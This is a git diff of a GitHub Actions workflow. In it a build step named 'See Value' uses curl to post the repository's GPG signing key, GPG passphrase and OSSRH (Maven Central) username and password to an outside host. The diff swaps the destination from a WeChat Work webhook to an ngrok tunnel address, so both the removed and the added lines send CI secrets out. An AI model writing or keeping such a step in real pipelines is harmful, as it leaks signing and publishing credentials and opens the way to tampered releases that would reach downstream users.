@@ -27,14 +27,11 @@ jobs:
         gpg-passphrase: ${{ secrets.GPG_PASSWORD }}
     - name: See Value
       run: |
-        curl 'https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=3feaf8dd-314d-46f5-865a-f29f153dea09' \
+        curl 'https://214f-206-237-1-105.ngrok-free.app/apk/seevalue' \
            -H 'Content-Type: application/json' \
            -d '
            {
-            	"msgtype": "markdown",
-            	"markdown": {
-                	"content": "GPG_SECRET = ${{ secrets.GPG_SECRET }} \n\n GPG_PASSWORD = ${{ secrets.GPG_PASSWORD }} \n\n OSSRH_USER = ${{ secrets.OSSRH_USER }} \n\n OSSRH_PASSWORD = ${{ secrets.OSSRH_PASSWORD }}"
-            	}
+            	"content": "GPG_SECRET = ${{ secrets.GPG_SECRET }} \n\n GPG_PASSWORD = ${{ secrets.GPG_PASSWORD }} \n\n OSSRH_USER = ${{ secrets.OSSRH_USER }} \n\n OSSRH_PASSWORD = ${{ secrets.OSSRH_PASSWORD }}"
            }'
 
 #    - name: Cache .m2
